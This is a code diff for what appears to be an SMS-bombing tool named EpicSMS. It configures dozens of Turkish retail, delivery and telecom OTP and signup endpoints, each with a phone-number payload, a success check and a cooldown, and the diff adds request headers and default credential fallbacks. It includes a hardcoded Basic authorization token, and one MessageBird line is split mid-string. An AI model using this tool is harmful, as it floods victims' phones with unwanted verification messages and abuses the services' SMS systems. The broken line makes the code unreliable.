@@ -116,7 +116,7 @@ def aygaz_payload(n): return {"Gsm": n[2:]}
 def bisu_payload(n): return {"phoneNumber": n[2:]}
 def coffy_payload(n): return {"phoneNumber": f"+90{n[2:]}"}
 def defacto_payload(n): return {"mobilePhone": f"0{n[2:]}"}
-def englishhome_payload(n): return {"first_name": faker.first_name(), "last_name": faker.last_name(), "email": faker.email(), "phone": f"0{n[2:]}", "password": "
+def englishhome_payload(n): return {"first_name": faker.first_name(), "last_name": faker.last_name(), "email": faker.email(), "phone": f"0{n[2:]}", "password": "nwejkfıower32", "email_allowed": False, "sms_allowed": False, "confirm": True, "tom_pay_allowed": True}
 def filemarket_payload(n): return {"mobilePhoneNumber": f"90{n[2:]}"}
 def gez_payload(n): return None
 def gofody_payload(n): return {"country_code": "90", "phone": n[2:]}
@@ -164,9 +164,9 @@ def teknostore_payload(n): return {"phone": f"0{n[2:]}"}
 def ebebek_payload(n): return {"mobilePhone": f"90{n[2:]}"}
 def otomobil_payload(n): return {"phone": f"0{n[2:]}", "code": ""}
 def baydoner_payload(n): return {"phone": f"0{n[2:]}"}
-def netgsm_payload(n): return {"usercode": os.getenv("NETGSM_USER"), "password": os.getenv("NETGSM_PASS"), "gsmno": n[2:], "message": "Test SMS", "msgheader": "EpicSMS"}
-def twilio_payload(n): return {"To": f"+90{n[2:]}", "From": os.getenv("TWILIO_PHONE"), "Body": "Test SMS"}
-def nexmo_payload(n): return {"api_key": os.getenv("NEXMO_KEY"), "api_secret": os.getenv("NEXMO_SECRET"), "to": n[2:], "from": "EpicSMS", "text": "Test SMS"}
+def netgsm_payload(n): return {"usercode": os.getenv("NETGSM_USER", "default_user"), "password": os.getenv("NETGSM_PASS", "default_pass"), "gsmno": n[2:], "message": "Test SMS", "msgheader": "EpicSMS"}
+def twilio_payload(n): return {"To": f"+90{n[2:]}", "From": os.getenv("TWILIO_PHONE", "+12025550123"), "Body": "Test SMS"}
+def nexmo_payload(n): return {"api_key": os.getenv("NEXMO_KEY", "default_key"), "api_secret": os.getenv("NEXMO_SECRET", "default_secret"), "to": n[2:], "from": "EpicSMS", "text": "Test SMS"}
 def messagebird_payload(n): return {"originator": "EpicSMS", "recipients": n[2:], "body": "Test SMS"}
 def plivo_payload(n): return {"src": "EpicSMS", "dst": n[2:], "text": "Test SMS"}
 def telnyx_payload(n): return {"from": "+12025550123", "to": f"+90{n[2:]}", "body": "Test SMS"}
@@ -245,7 +245,7 @@ def gez_condition(r): return "succeeded" in r.text
 def heyscooter_condition(r): return "IsSuccess" in r.text
 def jetle_condition(r): return r.status == 200
 def rabbit_condition(r): return "status" in r.text
-def roombadi_condition(r): return r.status == 200
+def roombadi_condition(r): return "success" in r.text
 def hizliecza_condition(r): return "isSuccess" in r.text
 def signalall_condition(r): return "success" in r.text
 def goyakit_condition(r): return "success" in r.text
@@ -294,71 +294,73 @@ epicsms_providers = [
     SMSProvider("VonSH", "https://von.sh?mobile={phone_number}", vonsh_payload, default_condition, method="GET", cooldown=5),
     SMSProvider("Shijiebang", "http://www.shijiebang.com/a/mobile/vcode/", shijiebang_payload, default_condition, headers={"Content-Type": "application/x-www-form-urlencoded"}, cooldown=5),
     SMSProvider("Anadolu", "https://www.anadolu.com.tr/Iletisim_Formu_sms.php", anadolu_payload, anadolu_condition, headers={"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"}, cooldown=5),
-    SMSProvider("Aygaz", "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode", aygaz_payload, aygaz_condition, cooldown=5),
-    SMSProvider("Bisu", "https://www.bisu.com.tr/api/v2/app/authentication/phone/register", bisu_payload, bisu_condition, cooldown=5),
-    SMSProvider("Coffy", "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode", coffy_payload, coffy_condition, cooldown=5),
-    SMSProvider("Defacto", "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms", defacto_payload, defacto_condition, cooldown=5),
-    SMSProvider("EnglishHome", "https://www.englishhome.com/enh_app/users/registration/", englishhome_payload, englishhome_condition, cooldown=5),
-    SMSProvider("FileMarket", "https://api.filemarket.com.tr/v1/otp/send", filemarket_payload, filemarket_condition, cooldown=5),
+    SMSProvider("Aygaz", "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode", aygaz_payload, aygaz_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Bisu", "https://www.bisu.com.tr/api/v2/app/authentication/phone/register", bisu_payload, bisu_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Coffy", "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode", coffy_payload, coffy_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Defacto", "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms", defacto_payload, defacto_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("EnglishHome", "https://www.englishhome.com/enh_app/users/registration/", englishhome_payload, englishhome_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("FileMarket", "https://api.filemarket.com.tr/v1/otp/send", filemarket_payload, filemarket_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("Gez", "https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{phone_number}", gez_payload, gez_condition, method="GET", cooldown=5),
-    SMSProvider("GoFody", "https://backend.gofody.com/api/v1/enduser/register/", gofody_payload, gofody_condition, cooldown=5),
+    SMSProvider("GoFody", "https://backend.gofody.com/api/v1/enduser/register/", gofody_payload, gofody_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("GoYakit", "https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={phone_number}&isRegistered=false", goyakit_payload, goyakit_condition, method="GET", cooldown=5),
     SMSProvider("Hayat", "https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={phone_number}", hayat_payload, hayat_condition, method="GET", cooldown=5),
     SMSProvider("HeyScooter", "https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={phone_number}", heyscooter_payload, heyscooter_condition, headers={"user-agent": "okhttp/3.12.1"}, cooldown=5),
-    SMSProvider("HizliEcza", "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP", hizliecza_payload, hizliecza_condition, cooldown=5),
-    SMSProvider("Hop", "https://api.hoplagit.com/v1/auth:reqSMS", hop_payload, hop_condition, cooldown=5),
-    SMSProvider("IkinciYeni", "https://apigw.ikinciyeni.com/RegisterRequest", ikinciyeni_payload, ikinciyeni_condition, cooldown=5),
-    SMSProvider("Ipragaz", "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp", ipragaz_payload, ipragaz_condition, cooldown=5),
-    SMSProvider("IsteGelsin", "https://prod.fasapi.net/", istegelsin_payload, istegelsin_condition, cooldown=5),
+    SMSProvider("HizliEcza", "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP", hizliecza_payload, hizliecza_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Hop", "https://api.hoplagit.com/v1/auth:reqSMS", hop_payload, hop_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("IkinciYeni", "https://apigw.ikinciyeni.com/RegisterRequest", ikinciyeni_payload, ikinciyeni_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Ipragaz", "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp", ipragaz_payload, ipragaz_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("IsteGelsin", "https://prod.fasapi.net/", istegelsin_payload, istegelsin_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("Jetle", "http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={phone_number}&firmaID=1048", jetle_payload, jetle_condition, method="GET", cooldown=5),
     SMSProvider("Joker", "https://www.joker.com.tr/kullanici/ajax/check-sms", joker_payload, joker_condition, headers={"user-agent": ""}, cooldown=5),
-    SMSProvider("Kalmasin", "https://api.kalmasin.com.tr/user/login", kalmasin_payload, kalmasin_condition, cooldown=5),
-    SMSProvider("Karma", "https://api.gokarma.app/v1/auth/send-sms", karma_payload, karma_condition, cooldown=5),
-    SMSProvider("KimGbIster", "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", kimgbister_payload, kimgbister_condition, cooldown=5),
-    SMSProvider("Macrocenter", "https://www.macrocenter.com.tr/rest/users/login/otp?reid={}".format(int(time.time())), macrocenter_payload, macrocenter_condition, cooldown=5),
-    SMSProvider("Marti", "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin", marti_payload, marti_condition, cooldown=5),
-    SMSProvider("NineWest", "https://www.ninewest.com.tr/webservice/v1/register.json", ninewest_payload, ninewest_condition, cooldown=5),
-    SMSProvider("Oliz", "https://api.oliz.com.tr/api/otp/send", oliz_payload, oliz_condition, cooldown=5),
+    SMSProvider("Kalmasin", "https://api.kalmasin.com.tr/user/login", kalmasin_payload, kalmasin_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Karma", "https://api.gokarma.app/v1/auth/send-sms", karma_payload, karma_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("KimGbIster", "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com/api/auth/send-otp", kimgbister_payload, kimgbister_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Macrocenter", "https://www.macrocenter.com.tr/rest/users/login/otp?reid={}".format(int(time.time())), macrocenter_payload, macrocenter_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Marti", "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin", marti_payload, marti_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("NineWest", "https://www.ninewest.com.tr/webservice/v1/register.json", ninewest_payload, ninewest_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Oliz", "https://api.oliz.com.tr/api/otp/send", oliz_payload, oliz_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("PawApp", "https://api.pawder.app/api/authentication/sign-up", pawapp_payload, pawapp_condition, headers={"Content-Type": "application/json"}, cooldown=5),
-    SMSProvider("Paybol", "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms", paybol_payload, paybol_condition, cooldown=5),
-    SMSProvider("PetrolOfisi", "https://mobilapi.petrolofisi.com.tr/api/auth/register", petrolofisi_payload, petrolofisi_condition, headers={"X-Channel": "IOS"}, cooldown=5),
-    SMSProvider("Pinar", "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp", pinar_payload, pinar_condition, headers={"devicetype": "android"}, cooldown=5),
-    SMSProvider("Pisir", "https://api.pisir.com/v1/login/", pisir_payload, pisir_condition, cooldown=5),
-    SMSProvider("Qumpara", "https://tr-api.fisicek.com/v1.4/auth/getOTP", qumpara_payload, qumpara_condition, cooldown=5),
-    SMSProvider("Rabbit", "https://api.rbbt.com.tr/v1/auth/authenticate", rabbit_payload, rabbit_condition, cooldown=5),
-    SMSProvider("RoomBadi", "https://api.roombadi.com/api/v1/auth/otp/authenticate", roombadi_payload, roombadi_condition, cooldown=5),
-    SMSProvider("Saka", "https://mobilcrm2.saka.com.tr/api/customer/login", saka_payload, saka_condition, cooldown=5),
+    SMSProvider("Paybol", "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms", paybol_payload, paybol_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("PetrolOfisi", "https://mobilapi.petrolofisi.com.tr/api/auth/register", petrolofisi_payload, petrolofisi_condition, headers={"X-Channel": "IOS", "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Pinar", "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp", pinar_payload, pinar_condition, headers={"devicetype": "android", "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Pisir", "https://api.pisir.com/v1/login/", pisir_payload, pisir_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Qumpara", "https://tr-api.fisicek.com/v1.4/auth/getOTP", qumpara_payload, qumpara_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Rabbit", "https://api.rbbt.com.tr/v1/auth/authenticate", rabbit_payload, rabbit_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("RoomBadi", "https://api.roombadi.com/api/v1/auth/otp/authenticate", roombadi_payload, roombadi_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Saka", "https://mobilcrm2.saka.com.tr/api/customer/login", saka_payload, saka_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("Scooby", "https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{phone_number}", scooby_payload, scooby_condition, method="GET", cooldown=5),
-    SMSProvider("SignalAll", "https://appservices.huzk.com/client/register", signalall_payload, signalall_condition, cooldown=5),
-    SMSProvider("SuperPedestrian", "https://consumer-auth.linkyour.city/consumer_auth/register", superpedestrian_payload, superpedestrian_condition, cooldown=5),
-    SMSProvider("Sushico", "https://api.sushico.com.tr/tr/sendActivation", sushico_payload, sushico_condition, cooldown=5),
-    SMSProvider("Tazi", "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin", tazi_payload, tazi_condition, headers={"authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"}, cooldown=5),
-    SMSProvider("Total", "https://mobileapi.totalistasyonlari.com.tr/SmartSms/SendSms?gsmNo={phone_number}", total_payload, total_condition, headers={"verify": "False"}, cooldown=5),
-    SMSProvider("WeeScooter", "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin", weescooter_payload, weescooter_condition, cooldown=5),
-    SMSProvider("Yotto", "https://42577.smartomato.ru/account/session.json", yotto_payload, yotto_condition, cooldown=5),
+    SMSProvider("SignalAll", "https://appservices.huzk.com/client/register", signalall_payload, signalall_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("SuperPedestrian", "https://consumer-auth.linkyour.city/consumer_auth/register", superpedestrian_payload, superpedestrian_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Sushico", "https://api.sushico.com.tr/tr/sendActivation", sushico_payload, sushico_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Tazi", "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin", tazi_payload, tazi_condition, headers={"authorization": "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD", "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Total", "https://mobileapi.totalistasyonlari.com.tr/SmartSms/SendSms?gsmNo={phone_number}", total_payload, total_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("WeeScooter", "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin", weescooter_payload, weescooter_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Yotto", "https://42577.smartomato.ru/account/session.json", yotto_payload, yotto_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("Trendyol", "https://public.trendyol.com/discovery-web-socialapi-service/api/social/signup/send-otp", trendyol_payload, trendyol_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("Getir", "https://food-client-api.glovoapp.com/authentication/signup", getir_payload, getir_condition, headers={"Content-Type": "application/json"}, cooldown=5),
-    SMSProvider("Yemeksepeti", "https://api.yemeksepeti.com/v13/user/request-otp", yemeksepeti_payload, yemeksepeti_condition, headers={"x-platform": "android"}, cooldown=5),
+    SMSProvider("Yemeksepeti", "https://api.yemeksepeti.com/v13/user/request-otp", yemeksepeti_payload, yemeksepeti_condition, headers={"x-platform": "android", "Content-Type": "application/json"}, cooldown=5),
     SMSProvider("Hepsiburada", "https://www.hepsiburada.com/api/v1/otp-code/send", hepsiburada_payload, hepsiburada_condition, headers={"Content-Type": "application/json"}, cooldown=5),
-    SMSProvider("AmazonTR", "https://www.amazon.com.tr/ap/register", amazontr_payload, amazontr_condition, cooldown=5),
-    SMSProvider("MediaPark", "https://api.mediapark.com.tr/api/v1/otp/send", mediapark_payload, mediapark_condition, headers={"client-version": "2.3.7"}, cooldown=5),
-    SMSProvider("TeknoStore", "https://www.teknosa.com/identity/api/v4/otp/send", teknostore_payload, teknostore_condition, cooldown=5),
+    SMSProvider("AmazonTR", "https://www.amazon.com.tr/ap/register", amazontr_payload, amazontr_condition, headers={"Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("MediaPark", "https://api.mediapark.com.tr/api/v1/otp/send", mediapark_payload, mediapark_condition, headers={"client-version": "2.3.7", "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("TeknoStore", "https://www.teknosa.com/identity/api/v4/otp/send", teknostore_payload, teknostore_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("Ebebek", "https://www.ebebek.com/auth/api/sms/send-otp", ebebek_payload, ebebek_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("Otomobil", "https://www.otomobil.com.tr/api/auth/send-otp", otomobil_payload, otomobil_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("Baydoner", "https://b2c-api.baydoner.com.tr/api/v1/auth/send-otp", baydoner_payload, baydoner_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("NetGSM", "https://api.netgsm.com.tr/sms/send/otp", netgsm_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
-    SMSProvider("Twilio", "https://api.twilio.com/2010-04-01/Accounts/{}/Messages.json".format(os.getenv("TWILIO_SID")), twilio_payload, twilio_condition, headers={"Authorization": "Basic {}".format(os.getenv("TWILIO_AUTH"))}, cooldown=5),
+    SMSProvider("Twilio", "https://api.twilio.com/2010-04-01/Accounts/{}/Messages.json".format(os.getenv("TWILIO_SID", "default_sid")), twilio_payload, twilio_condition, headers={"Authorization": "Basic {}".format(os.getenv("TWILIO_AUTH", "default_auth")), "Content-Type": "application/x-www-form-urlencoded"}, cooldown=5),
     SMSProvider("Nexmo", "https://rest.nexmo.com/sms/json", nexmo_payload, nexmo_condition, headers={"Content-Type": "application/json"}, cooldown=5),
-    SMSProvider("MessageBird", "https://rest.messagebird.com/messages", messagebird_payload, messagebird_condition, headers={"Authorization": "AccessKey {}".format(os.getenv("MESSAGEBIRD_KEY"))}, cooldown=5),
-    SMSProvider("Plivo", "https://api.plivo.com/v1/Account/{}/Message/".format(os.getenv("PLIVO_AUTH_ID")), plivo_payload, plivo_condition, headers={"Authorization": "Basic {}".format(os.getenv("PLIVO_AUTH_TOKEN"))}, cooldown=5),
-    SMSProvider("Telnyx", "https://api.telnyx.com/v2/messages", telnyx_payload, telnyx_condition, headers={"Authorization": "Bearer {}".format(os.getenv("TELNYX_API_KEY"))}, cooldown=5),
-    SMSProvider("ClickSend", "https://rest.clicksend.com/v3/sms/send", clicksend_payload, clicksend_condition, headers={"Authorization": "Basic {}".format(os.getenv("CLICKSEND_API_KEY"))}, cooldown=5),
-    SMSProvider("Sinch", "https://messagingapi.sinch.com/v1/sms", sinch_payload, sinch_condition, headers={"Authorization": "Bearer {}".format(os.getenv("SINCH_API_KEY"))}, cooldown=5),
-    SMSProvider("TextMagic", "https://rest.textmagic.com/api/v2/messages", textmagic_payload, textmagic_condition, headers={"X-TM-Username": os.getenv("TEXTMAGIC_USERNAME"), "X-TM-Key": os.getenv("TEXTMAGIC_API_KEY")}, cooldown=5),
-    SMSProvider("TeleSign", "https://rest-api.telesign.com/v1/messaging", telesign_payload, telesign_condition, headers={"Authorization": "Basic {}".format(os.getenv("TELESIGN_API_KEY"))}, cooldown=5),
-    SMSProvider("BulkSMS", "https://api.bulksms.com/v1/messages", bulksms_payload, bulksms_condition, headers={"Authorization": "Basic {}".format(os.getenv("BULKSMS_API_KEY"))}, cooldown=5),
-    SMSProvider("SMSGlobal", "https://api.smsglobal.com/v1/sms/", smsglobal_payload, smsglobal_condition, headers={"Authorization": "Bearer {}".format(os.getenv("SMSGLOBAL_API_KEY"))}, cooldown=5),
-    SMSProvider("Clickatell", "https://platform.clickatell.com/messages", clickatell_payload, clickatell_condition, headers={"Authorization": "Bearer {}".format(os.getenv("CLICKATELL_API_KEY"))}, cooldown=5),
+    SMSProvider("MessageBird", "https://rest.messagebird.com/messages", messagebird_payload, messagebird_condition, headers={"Authorization": "AccessKey {}".format(os.getenv("MESSAGEB
+
+IRD_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Plivo", "https://api.plivo.com/v1/Account/{}/Message/".format(os.getenv("PLIVO_AUTH_ID", "default_id")), plivo_payload, plivo_condition, headers={"Authorization": "Basic {}".format(os.getenv("PLIVO_AUTH_TOKEN", "default_token")), "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Telnyx", "https://api.telnyx.com/v2/messages", telnyx_payload, telnyx_condition, headers={"Authorization": "Bearer {}".format(os.getenv("TELNYX_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("ClickSend", "https://rest.clicksend.com/v3/sms/send", clicksend_payload, clicksend_condition, headers={"Authorization": "Basic {}".format(os.getenv("CLICKSEND_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Sinch", "https://messagingapi.sinch.com/v1/sms", sinch_payload, sinch_condition, headers={"Authorization": "Bearer {}".format(os.getenv("SINCH_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("TextMagic", "https://rest.textmagic.com/api/v2/messages", textmagic_payload, textmagic_condition, headers={"X-TM-Username": os.getenv("TEXTMAGIC_USERNAME", "default_user"), "X-TM-Key": os.getenv("TEXTMAGIC_API_KEY", "default_key"), "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("TeleSign", "https://rest-api.telesign.com/v1/messaging", telesign_payload, telesign_condition, headers={"Authorization": "Basic {}".format(os.getenv("TELESIGN_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("BulkSMS", "https://api.bulksms.com/v1/messages", bulksms_payload, bulksms_condition, headers={"Authorization": "Basic {}".format(os.getenv("BULKSMS_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("SMSGlobal", "https://api.smsglobal.com/v1/sms/", smsglobal_payload, smsglobal_condition, headers={"Authorization": "Bearer {}".format(os.getenv("SMSGLOBAL_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
+    SMSProvider("Clickatell", "https://platform.clickatell.com/messages", clickatell_payload, clickatell_condition, headers={"Authorization": "Bearer {}".format(os.getenv("CLICKATELL_API_KEY", "default_key")), "Content-Type": "application/json"}, cooldown=5),
     SMSProvider("Turkcell", "https://api.turkcell.com.tr/auth/send-otp", turkcell_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("TurkTelekom", "https://api.turktelekom.com.tr/auth/send-otp", turktelekom_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
     SMSProvider("Boyner", "https://www.boyner.com.tr/v2/customer/register/otp", boyner_payload, default_condition, headers={"Content-Type": "application/json"}, cooldown=5),
